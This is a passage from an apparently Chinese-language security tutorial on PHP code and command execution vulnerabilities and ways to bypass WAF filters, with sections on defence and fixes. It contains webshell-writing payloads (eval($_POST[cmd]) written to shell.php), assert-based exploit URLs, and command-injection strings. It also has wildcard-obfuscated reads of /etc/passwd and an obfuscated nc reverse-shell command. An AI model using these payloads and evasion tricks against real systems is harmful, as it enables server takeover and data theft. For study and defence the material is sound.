<h4 id="h、usort-、uasort"><a href="#h、usort-、uasort" class="headerlink" title="h、usort()、uasort()"></a>h、usort()、uasort()</h4><p>&emsp;&emsp;<code>usort()</code>通过用户自定义的比较函数对数组进行排序。</p>
<p>&emsp;&emsp;<code>uasort()</code>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。</p>
<p>&emsp;&emsp;代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php环境&gt;=<span class="number">5.6</span>才能用</span><br><span class="line"><span class="meta">&lt;?php</span> usort(...<span class="variable">$_GET</span>);<span class="meta">?&gt;</span></span><br><span class="line">利用方式：</span><br><span class="line">test.php?<span class="number">1</span>[]=<span class="number">1</span>-<span class="number">1</span>&amp;<span class="number">1</span>[]=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])&amp;<span class="number">2</span>=assert</span><br><span class="line">[POST]:x=phpinfo();</span><br><span class="line"></span><br><span class="line">php环境&gt;=&lt;<span class="number">5.6</span>才能用</span><br><span class="line"><span class="meta">&lt;?php</span> usort(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">利用方式：</span><br><span class="line">test.php?<span class="number">1</span>=<span class="number">1</span>+<span class="number">1</span>&amp;<span class="number">2</span>=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x])</span><br><span class="line">[POST]:x=phpinfo();</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p>
<h4 id="i、文件操作函数"><a href="#i、文件操作函数" class="headerlink" title="i、文件操作函数"></a>i、文件操作函数</h4><p>&emsp;&emsp;<code>file_put_contents()</code> 函数把一个字符串写入文件中。</p>
<p>&emsp;&emsp;<code>fputs()</code> 函数写入文件</p>
<p>&emsp;&emsp;代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$test</span>=<span class="string">&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&#x27;test1.php&#x27;</span>,<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="j、动态函数"><a href="#j、动态函数" class="headerlink" title="j、动态函数"></a>j、动态函数</h4><p>&emsp;&emsp;PHP函数直接由字符串拼接</p>
<p>&emsp;&emsp;代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?a=assert&amp;b=phpinfo()</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="（2）Java"><a href="#（2）Java" class="headerlink" title="（2）Java"></a>（2）Java</h3><p>待更新…..</p>
<h3 id="（3）Python"><a href="#（3）Python" class="headerlink" title="（3）Python"></a>（3）Python</h3><p>待更新…..</p>
<h2 id="2、产生"><a href="#2、产生" class="headerlink" title="2、产生"></a>2、产生</h2><h3 id="（1）Web源码"><a href="#（1）Web源码" class="headerlink" title="（1）Web源码"></a>（1）Web源码</h3><ul>
<li><p>thinkphp</p>
</li>
<li><p>eyoucms</p>
</li>
<li><p>wordpress</p>
</li>
</ul>
<h3 id="（2）中间件平台"><a href="#（2）中间件平台" class="headerlink" title="（2）中间件平台"></a>（2）中间件平台</h3><ul>
<li><p>Tomcat</p>
</li>
<li><p>apache</p>
</li>
<li><p>struts2</p>
</li>
<li><p>Redis</p>
</li>
<li><p>Nginx：<a href="https://wolke.cn/post/4f87817f.html">PHP 远程代码执行漏洞复现（CVE-2019-11043）</a></p>
</li>
</ul>
<h3 id="（3）其他环境"><a href="#（3）其他环境" class="headerlink" title="（3）其他环境"></a>（3）其他环境</h3><ul>
<li><p>php-cgi</p>
</li>
<li><p>jenkins-cl</p>
</li>
<li><p>java RMI</p>
</li>
</ul>
<h2 id="3、监测"><a href="#3、监测" class="headerlink" title="3、监测"></a>3、监测</h2><h3 id="（1）白盒"><a href="#（1）白盒" class="headerlink" title="（1）白盒"></a>（1）白盒</h3><ul>
<li>代码审计</li>
</ul>
<h3 id="（2）黑盒"><a href="#（2）黑盒" class="headerlink" title="（2）黑盒"></a>（2）黑盒</h3><ul>
<li><p>漏扫工具</p>
</li>
<li><p>公开漏洞</p>
</li>
<li><p>手工看参数及功能点</p>
</li>
</ul>
<h2 id="4、防御"><a href="#4、防御" class="headerlink" title="4、防御"></a>4、防御</h2><ul>
<li><p>敏感函数禁用</p>
</li>
<li><p>变量过滤或固定</p>
</li>
<li><p>waf产品</p>
</li>
</ul>
<h1 id="二、命令执行"><a href="#二、命令执行" class="headerlink" title="二、命令执行"></a>二、命令执行</h1><h2 id="1、命令执行漏洞原理"><a href="#1、命令执行漏洞原理" class="headerlink" title="1、命令执行漏洞原理"></a>1、命令执行漏洞原理</h2><p>&emsp;&emsp;应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用<code>system</code>、<code>exec</code>、<code>shell_exec</code>、<code>passthru</code>、 <code>pcntl_exec</code>、<code>popen</code>、<code>proc_popen</code>、 <code>反引号</code>等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞</p>
<h3 id="（1）system"><a href="#（1）system" class="headerlink" title="（1）system()"></a>（1）system()</h3><p>system — 执行外部程序，并且显示输出 (PHP 4, PHP 5, PHP 7, PHP 8)  </p>
<p><strong>语法：</strong><code>system(string $command, int &amp;$return_var = ?): string</code> </p>
<p><strong>参数：</strong></p>
<ul>
<li>command为要执行的命令。</li>
<li>return_var如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。 </li>
</ul>
<p><strong>返回值：</strong> 成功则返回命令输出的最后一行， 失败则返回 false</p>
<p>同 C 版本的 <code>system()</code> 函数一样， 本函数执行 command 参数所指定的命令， 并且输出执行结果。 </p>
<p>如果 PHP 运行在服务器模块中， <code>system()</code> 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。 </p>
<p>如果要获取一个命令未经任何处理的原始输出， 请使用 <code>passthru()</code> 函数。 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 shell 命令 &quot;ls&quot; 的返回结果</span></span><br><span class="line"><span class="comment">// 并且将输出的最后一样内容返回到 $last_line。</span></span><br><span class="line"><span class="comment">// 将命令的返回值保存到 $retval。</span></span><br><span class="line"><span class="variable">$last_line</span> = system(<span class="string">&#x27;ls&#x27;</span>, <span class="variable">$retval</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印更多信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Last line of the output: &#x27;</span> . <span class="variable">$last_line</span> . <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Return value: &#x27;</span> . <span class="variable">$retval</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="（2）exec"><a href="#（2）exec" class="headerlink" title="（2）exec()"></a>（2）exec()</h3><p>exec — 执行一个外部程序 (PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><strong>语法：</strong><code>exec(string $command, array &amp;$output = ?, int &amp;$return_var = ?): string</code></p>
<p><strong>参数：</strong></p>
<ul>
<li><p>command要执行的命令。</p>
</li>
<li><p>output如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 <code>\n</code> 字符。 请注意，如果数组中已经包含了部分元素，<code>exec()</code> 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 <code>exec()</code> 函数之前对数组使用 <code>unset()</code> 函数进行重置。 </p>
</li>
<li><p>return_var如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。 </p>
</li>
</ul>
<p><strong>返回值：</strong>命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 <code>passthru()</code> 函数。 如果想要获取命令的输出内容， 请确保使用 output 参数。</p>
<p><strong>注意：</strong>在 Windows 下，<code>exec()</code> 函数会先启动 cmd.exe 来执行指定的命令。如果你希望启动一个额外的应用而不用先启动 cmd.exe 可使用 <code>proc_open()</code> 函数加上 bypass_shell 参数。 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 输出运行中的 php/httpd 进程的创建者用户名</span></span><br><span class="line"><span class="comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="（3）passthru"><a href="#（3）passthru" class="headerlink" title="（3）passthru()"></a>（3）passthru()</h3><p>passthru — 执行外部程序并且显示原始输出 (PHP 4, PHP 5, PHP 7, PHP 8) </p>
<p><strong>语法：</strong><code>passthru(string $command, int &amp;$return_var = ?): void</code> command</p>
<p>要执行的命令。 return_var如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。 </p>
<p><strong>返回值：</strong>没有返回值</p>
<p>同 <code>exec()</code> 函数类似， <code>passthru()</code> 函数也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <code>exec()</code> 或 <code>system()</code> 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p>
<h3 id="（4）shell-exec"><a href="#（4）shell-exec" class="headerlink" title="（4）shell_exec()"></a>（4）shell_exec()</h3><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
<p><strong>语法：</strong><code>shell_exec(string $cmd): string</code>，本函数同执行操作符</p>
<p><strong>返回值：</strong>命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 null。</p>
<p><strong>注意：</strong> 当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 null， 所以，使用本函数无法通过返回值检测进程是否成功执行。 如果需要检查进程执行的退出码，请使用 exec() 函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = shell_exec(<span class="string">&#x27;ls -lart&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="（5）执行运算符（反引号-）"><a href="#（5）执行运算符（反引号-）" class="headerlink" title="（5）执行运算符（反引号`）"></a>（5）执行运算符（反引号`）</h3><p>PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“<code>\</code>”的效果与函数 <code>shell_exec()</code> 相同。</p>
<p><strong>注意：</strong> 关闭了 shell_exec() 时反引号运算符是无效的。与其它某些语言不同，反引号不能在双引号字符串中使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = `ls -al`;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="（6）proc-open"><a href="#（6）proc-open" class="headerlink" title="（6）proc_open()"></a>（6）proc_open()</h3><p>proc_open —  执行一个命令，并且打开用来输入/输出的文件指针。 (PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</p>
<p><strong>语法：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> proc_open(</span><br><span class="line">    <span class="keyword">mixed</span> <span class="variable">$cmd</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$descriptorspec</span>,</span><br><span class="line">    <span class="keyword">array</span> &amp;<span class="variable">$pipes</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$cwd</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$env</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$other_options</span> = <span class="literal">null</span></span><br><span class="line">): resource</span><br></pre></td></tr></table></figure>

<p>类似 <code>popen()</code> 函数， 但是 <code>proc_open()</code> 提供了更加强大的控制程序执行的能力。</p>
<p>具体参考：<a href="https://www.php.net/manual/zh/function.proc-open.php">https://www.php.net/manual/zh/function.proc-open.php</a></p>
<h2 id="2、命令执行漏洞利用条件"><a href="#2、命令执行漏洞利用条件" class="headerlink" title="2、命令执行漏洞利用条件"></a>2、命令执行漏洞利用条件</h2><ol>
<li>应用调用执行系统命令的函数</li>
<li>将用户输入作为系统命令的参数拼接到了命令行中</li>
<li>没有对用户输入进行过滤或过滤不严</li>
</ol>
<h2 id="3、漏洞分类"><a href="#3、漏洞分类" class="headerlink" title="3、漏洞分类"></a>3、漏洞分类</h2><h3 id="（1）代码层过滤不严"><a href="#（1）代码层过滤不严" class="headerlink" title="（1）代码层过滤不严"></a>（1）代码层过滤不严</h3><p>&emsp;&emsp;商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：<code>system(&quot;/bin/program --arg $arg&quot;);</code></p>
<h3 id="（2）系统的漏洞造成命令注入"><a href="#（2）系统的漏洞造成命令注入" class="headerlink" title="（2）系统的漏洞造成命令注入"></a>（2）系统的漏洞造成命令注入</h3><p>&emsp;&emsp;bash破壳漏洞（CVE-2014-6271）</p>
<h3 id="（3）调用的第三方组件存在代码执行漏洞"><a href="#（3）调用的第三方组件存在代码执行漏洞" class="headerlink" title="（3）调用的第三方组件存在代码执行漏洞"></a>（3）调用的第三方组件存在代码执行漏洞</h3><ul>
<li><p>如wordPress中用来处理图片的imageMagick组件</p>
</li>
<li><p>JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）</p>
</li>
<li><p>ThinkPHP命令执行</p>
</li>
</ul>
<h2 id="4、漏洞危害"><a href="#4、漏洞危害" class="headerlink" title="4、漏洞危害"></a>4、漏洞危害</h2><ul>
<li><p>继承Web服务程序的权限去执行系统命令或读写文件</p>
</li>
<li><p>反弹shell</p>
</li>
<li><p>控制整个网站甚至服务器</p>
</li>
<li><p>进一步内网渗透</p>
</li>
<li><p>等等</p>
</li>
</ul>
<h2 id="5、命令执行漏洞攻击"><a href="#5、命令执行漏洞攻击" class="headerlink" title="5、命令执行漏洞攻击"></a>5、命令执行漏洞攻击</h2><p>&emsp;&emsp;页面rec.php提供了ping的功能，当给参数IP输入127.0.0.1时，程序会执行ping 127.0.0.1，然后将ping的结果返回到页面上</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1618127410623-c19c0b98-875f-42be-acc0-43685093b89f.png" alt="img"></p>
<p>&emsp;&emsp;而如果将参数IP设置为127.0.0.1|dir，然后再次访问，从返回结果可以看到，程序直接将目录结构返回到页面上了，这里就利用了管道符”|”让系统执行了命令dir</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1618127542402-15da8f0d-4628-44cf-ba6f-9c83cbb373be.png" alt="img"></p>
<h3 id="（1）命令拼接符-、-、-amp-、-amp-amp-的区别："><a href="#（1）命令拼接符-、-、-amp-、-amp-amp-的区别：" class="headerlink" title="（1）命令拼接符 |、||、&amp;、&amp;&amp; 的区别："></a>（1）命令拼接符 |、||、&amp;、&amp;&amp; 的区别：</h3><table>
<thead>
<tr>
<th>&amp;</th>
<th>不管前后命令是否执行成功都会执行前后命令</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;&amp;</td>
<td>具有<strong>短路效果</strong>。 前面的命令执行成功才能执行后面的命令</td>
</tr>
<tr>
<td>|</td>
<td>管道符， 上一条命令的输出，作为下一条命令参数(输入)  。在拼接时，无论左边是false还是true，右边都会执行</td>
</tr>
<tr>
<td>||</td>
<td>具有<strong>短路效果</strong>。 前面的命令执行不成功才能执行后面的命令</td>
</tr>
</tbody></table>
<h3 id="（2）Windows系列支持的管道符"><a href="#（2）Windows系列支持的管道符" class="headerlink" title="（2）Windows系列支持的管道符"></a>（2）Windows系列支持的管道符</h3><ul>
<li>**|**：直接执行后面的语句，例如：<code>ping 127.0.0.1|whoami</code></li>
<li>**||**：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如<code>ping 2||whoami</code></li>
<li>**&amp;**：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：<code>ping 127.0.0.1&amp;whoami</code></li>
<li>**&amp;&amp;**：如果前面的语句为假直接出错，也不执行后面的语句，前面的语句只能为真。例如：<code>ping 127.0.0.1&amp;&amp;whoami</code></li>
</ul>
<h3 id="（3）Linux系统支持的管道符"><a href="#（3）Linux系统支持的管道符" class="headerlink" title="（3）Linux系统支持的管道符"></a>（3）Linux系统支持的管道符</h3><ul>
<li><strong>;</strong> ：无论前面真假，执行完前面的语句再执行后面的。例如：ping <code>127.0.0.1;whoami</code></li>
<li>**|**：显示后面语句执行的结果，例如：<code>ping 127.0.0.1|whoami</code></li>
<li>**||**：当前面执行的语句出错时，执行后面的语句。例如<code>ping 1||whoami</code></li>
<li>**&amp;**：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：<code>ping 127.0.0.1&amp;whoami</code></li>
<li>**&amp;&amp;**：如果前面的语句为假直接出错，也不执行后面的语句，前面的语句只能为真。例如：<code>ping 127.0.0.1&amp;&amp;whoami</code></li>
</ul>
<h3 id="（4）例子分析"><a href="#（4）例子分析" class="headerlink" title="（4）例子分析"></a>（4）例子分析</h3><ul>
<li><p><code>ping 127.0.0.1&amp;ipconfig</code>       #在linux系统里是几乎同时执行</p>
</li>
<li><p><code>ping 127.0.0.1 &amp;&amp; ipconfig</code>    #在linux系统里执行完前面再去执行后面</p>
</li>
<li><p><code>ping 127.0.0.1 &amp;;&amp; ipconfig</code>   #其中**;**会被解析为空</p>
</li>
<li><p><code>ping 127.0.0.1 || ipconfig</code>   #在linux中两个**||** = <strong>or</strong></p>
</li>
<li><p><code>ping 127.0.0.1 | ipconfig</code>   #在linux中**|**叫管道符，把前面一个命令执行的结果给后面的命令执行  </p>
</li>
</ul>
<h2 id="6、命令执行漏洞代码分析"><a href="#6、命令执行漏洞代码分析" class="headerlink" title="6、命令执行漏洞代码分析"></a>6、命令执行漏洞代码分析</h2><p>&emsp;&emsp;服务端处理ping的代码如下所示，程序获取GET参数IP，然后拼接到system()函数中，利用system()函数执行ping的功能，但是此处没有对参数IP做过滤和检测，导致可以利用管道符执行其他的系统命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> system(<span class="string">&quot;ping -n 2 &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当我们发现一台主机有RCE</p>
<ul>
<li><p>查看当前权限</p>
</li>
<li><p>当前所在目录</p>
</li>
<li><p>用户类型</p>
</li>
<li><p>是否可以写入一句话木马</p>
</li>
<li><p>是否可以开启一个服务器写入exp进行提权</p>
</li>
</ul>
<h2 id="7、命令执行漏洞修复建议"><a href="#7、命令执行漏洞修复建议" class="headerlink" title="7、命令执行漏洞修复建议"></a>7、命令执行漏洞修复建议</h2><ul>
<li><p>尽量不要使用命令执行函数</p>
</li>
<li><p>客户端提交的变量再进入执行命令函数前要做好过滤和检测</p>
</li>
<li><p>在使用动态函数之前，确保使用的函数是指定的函数之一</p>
</li>
<li><p>对PHP语言来说，不能完全控制的危险函数最好不要使用</p>
</li>
</ul>
<h1 id="三、命令执行WAF绕过技巧"><a href="#三、命令执行WAF绕过技巧" class="headerlink" title="三、命令执行WAF绕过技巧"></a>三、命令执行WAF绕过技巧</h1><p>&emsp;&emsp;语法：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配任意长度任意字符</td>
</tr>
<tr>
<td>?</td>
<td>匹配任意单个字符</td>
</tr>
<tr>
<td>[list]</td>
<td>匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
</tr>
<tr>
<td>[^list]</td>
<td>匹配指定范围外的任意单个字符或字符集合</td>
</tr>
<tr>
<td>[!list]</td>
<td>同[^list]</td>
</tr>
<tr>
<td>{str1,str2,…}</td>
<td>匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
</tr>
</tbody></table>
<p>&emsp;&emsp;专用字符集：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>[:alnum:]</td>
<td>任意数字或者字母</td>
</tr>
<tr>
<td>[:alpha:]</td>
<td>任意字母</td>
</tr>
<tr>
<td>[:space:]</td>
<td>空格</td>
</tr>
<tr>
<td>[:lower:]</td>
<td>小写字母</td>
</tr>
<tr>
<td>[:digit:]</td>
<td>任意数字</td>
</tr>
<tr>
<td>[:upper:]</td>
<td>任意大写字母</td>
</tr>
<tr>
<td>[:cntrl:]</td>
<td>控制符</td>
</tr>
<tr>
<td>[:graph:]</td>
<td>图形</td>
</tr>
<tr>
<td>[:print:]</td>
<td>可打印字符</td>
</tr>
<tr>
<td>[:punct:]</td>
<td>标点符号</td>
</tr>
<tr>
<td>[:xdigit:]</td>
<td>十六进制数</td>
</tr>
<tr>
<td>[:blank:]</td>
<td>空白字符（未验证）</td>
</tr>
</tbody></table>
<p>&emsp;&emsp;Linux Shell元字符，在使用通配符时如果没有进行转义可能就会被辨识为元字符</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>IFS</td>
<td>由 &lt; space &gt; 或 &lt; tab &gt;或 &lt; enter &gt; 三者之一组成</td>
</tr>
<tr>
<td>CR</td>
<td>由 &lt; enter &gt; 产生</td>
</tr>
<tr>
<td>=</td>
<td>设定变量</td>
</tr>
<tr>
<td>$</td>
<td>作变量或运算替换</td>
</tr>
<tr>
<td>&gt;</td>
<td>重导向标准输出</td>
</tr>
<tr>
<td>&lt;</td>
<td>重导向标准输入</td>
</tr>
<tr>
<td>|</td>
<td>命令管线</td>
</tr>
<tr>
<td>&amp;</td>
<td>重导向文件描述符，或将命令静默执行</td>
</tr>
<tr>
<td>( )</td>
<td>将其内的命令置于 nested subshell 执行，或用于运算或命令替换</td>
</tr>
<tr>
<td>{ }</td>
<td>将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围</td>
</tr>
<tr>
<td>;</td>
<td>在前一个命令结束时，而忽略其返回值，继续执行下一个命令</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>在前一个命令结束时，若返回值为 true，继续执行下一个命令</td>
</tr>
<tr>
<td>||</td>
<td>在前一个命令结束时，若返回值为 false，继续执行下一个命令</td>
</tr>
<tr>
<td>!</td>
<td>执行 history 中的命令</td>
</tr>
</tbody></table>
<h2 id="1、面对屏蔽关键词（黑名单绕过）"><a href="#1、面对屏蔽关键词（黑名单绕过）" class="headerlink" title="1、面对屏蔽关键词（黑名单绕过）"></a>1、面对屏蔽关键词（黑名单绕过）</h2><h3 id="（1）使用连接符"><a href="#（1）使用连接符" class="headerlink" title="（1）使用连接符"></a>（1）使用连接符</h3><h4 id="a、单引号-双引号"><a href="#a、单引号-双引号" class="headerlink" title="a、单引号/双引号"></a>a、单引号/双引号</h4><p>&emsp;&emsp;比如有的Linux会屏蔽ls，可以使用单引号进行绕过。例如<code>127.0.0.1 | l&#39;s&#39;</code>来进行绕过，但是要谨记一点：<strong>引号的个数必须要是偶数个，才能完成闭合（命令完成闭合，文件/目录名完成闭合，不能命令中一个引号和文件/目录中一个引号闭合，这样无法闭合）</strong></p>
<h4 id="b、反斜杠"><a href="#b、反斜杠" class="headerlink" title="b、反斜杠\"></a>b、反斜杠\</h4><p>&emsp;&emsp;<code>\c\a\t pas\s\.tx\t</code>，不用闭合，想多少个就多少个。但注意不要两个\在一块，否则会\会被转义成字符串\</p>
<h3 id="（2）使用类似命令"><a href="#（2）使用类似命令" class="headerlink" title="（2）使用类似命令"></a>（2）使用类似命令</h3><h4 id="a、读文件绕过"><a href="#a、读文件绕过" class="headerlink" title="a、读文件绕过"></a>a、读文件绕过</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(1) cat</span><br><span class="line">(2) paste: 会把每个文件以列对列的方式，一列列地加以合并</span><br><span class="line">(3) more: 一页一页的显示档案内容</span><br><span class="line">(4) less: 与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(5) head: 查看头几行</span><br><span class="line">(6) tac: 从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(7) tail: 查看尾几行</span><br><span class="line">(8) nl：显示的时候，顺便输出行号</span><br><span class="line">(9) od: 以二进制的方式读取档案内容</span><br><span class="line">(10) vi: 一种编辑器，这个也可以查看</span><br><span class="line">(11) vim: 一种编辑器，这个也可以查看</span><br><span class="line">(12) sort: 可以查看</span><br><span class="line">(13) uniq: 可以查看</span><br><span class="line">(14) file -f: 报错出具体内容</span><br><span class="line">$ more ts1   //查看文件ts1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">$ more ts2   //查看文件ts2</span><br><span class="line">cat</span><br><span class="line">paste</span><br><span class="line">$ cat ts1 ts2  //按行合并</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">cat</span><br><span class="line">paste</span><br><span class="line">$ paste ts1 ts2 //按列合并</span><br><span class="line">1 cat</span><br><span class="line">2 paste</span><br></pre></td></tr></table></figure>

<h3 id="（3）使用通配符"><a href="#（3）使用通配符" class="headerlink" title="（3）使用通配符"></a>（3）使用通配符</h3><h4 id="a、低阶用法"><a href="#a、低阶用法" class="headerlink" title="a、低阶用法"></a>a、低阶用法</h4><p>&emsp;&emsp;屏蔽了php：<code>127.0.0.1 | c&#39;a&#39;t ../haha.ph*</code>  <code>127.0.0.1 | c&#39;a&#39;t ../haha.ph?</code></p>
<p>&emsp;&emsp;屏蔽了命令和路径等：<code>/bin/cat /etc/passwd</code> 变成 <code>/???/c?t /??c/p???w?</code> ，有时候WAF不允许使用太多的?号就<code>/?in/c?t /?tc/p?sswd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/???/[l-n]s     可替代ls</span><br><span class="line">/???/c?t flag   可替代cat flag</span><br><span class="line">ls *.php        列出当前目录下所有php文件</span><br></pre></td></tr></table></figure>

<h4 id="b、进阶用法（无字母数字匹配）"><a href="#b、进阶用法（无字母数字匹配）" class="headerlink" title="b、进阶用法（无字母数字匹配）"></a>b、进阶用法（无字母数字匹配）</h4><p>&emsp;&emsp;如果我们遇到一个正则将 <code>字母</code>、<code>数字</code>、<code>$</code> 这些都过滤掉，要我们执行一个脚本的话，假如脚本名称为chakdiD且在根目录/etc下，我们可以用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. /???/??????[@-[]</span><br><span class="line">[@-[]表示取从@到[之间的字符，这之间的字符都为大写字母。这样就实现了无字母数字匹配的命令，就可以绕过正则了。</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;几个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/???/[:lower:]s</span><br><span class="line">/?s?/???/[n]c 2130706433 8888 -e /???/b??h</span><br><span class="line">ls &#123;/ru,/tmp&#125;n</span><br></pre></td></tr></table></figure>

<h3 id="（4）变量拼接"><a href="#（4）变量拼接" class="headerlink" title="（4）变量拼接"></a>（4）变量拼接</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali: a=c;b=at;c=fl;d=ag;$a<span class="variable">$b</span> $c<span class="variable">$d</span></span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>

<h3 id="（5）编码绕过"><a href="#（5）编码绕过" class="headerlink" title="（5）编码绕过"></a>（5）编码绕过</h3><h4 id="a、进制编码"><a href="#a、进制编码" class="headerlink" title="a、进制编码"></a>a、进制编码</h4><p>&emsp;&emsp;参考<a href="https://zhidao.baidu.com/question/628764933342214124.html">https://zhidao.baidu.com/question/628764933342214124.html</a></p>
<p>&emsp;&emsp;对应于ACSII码，\是八进制转义字符，\x为十六进制转义字符</p>
